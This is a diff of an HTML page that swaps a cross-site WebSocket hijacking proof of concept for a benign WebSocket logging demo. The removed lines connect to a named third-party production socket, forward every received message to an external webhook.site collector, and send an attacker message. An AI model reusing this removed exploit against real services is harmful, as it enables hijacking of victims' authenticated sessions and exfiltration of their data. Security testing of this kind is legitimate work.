@@ -1,22 +1,42 @@
-<p>CSWSH_TEST</p>
-<button onclick="sendAdditionalMessage()">Send Additional Message</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebSocket Example</title>
+</head>
+<body>
+
+<button onclick="sendWebSocketMessage()">Send WebSocket Message</button>
 
 <script>
+    // Establish a WebSocket connection
     var ws = new WebSocket('wss://pusher-live.browserstack.com/socket.io/?EIO=3&transport=websocket');
 
     ws.onopen = function() {
-        ws.send("READY");
+        console.log('WebSocket connection opened');
+        ws.send("READY");  // Send a message immediately upon connecting
     };
 
     ws.onmessage = function(event) {
-        fetch('https://webhook.site/469d381a-8e9e-4ef6-b343-9a736c0749fd', {method: 'POST', mode: 'no-cors', body: event.data});
+        console.log('Received message from server:', event.data);
     };
 
-    function sendAdditionalMessage() {
-        ws.send("ATTACKER MESSAGE HERE");
+    ws.onerror = function(error) {
+        console.error('WebSocket Error:', error);
+    };
+
+    ws.onclose = function() {
+        console.log('WebSocket connection closed');
+    };
+
+    function sendWebSocketMessage() {
+        ws.send("Hello Server!");
     }
 </script>
 
+</body>
+</html>
 
 
 
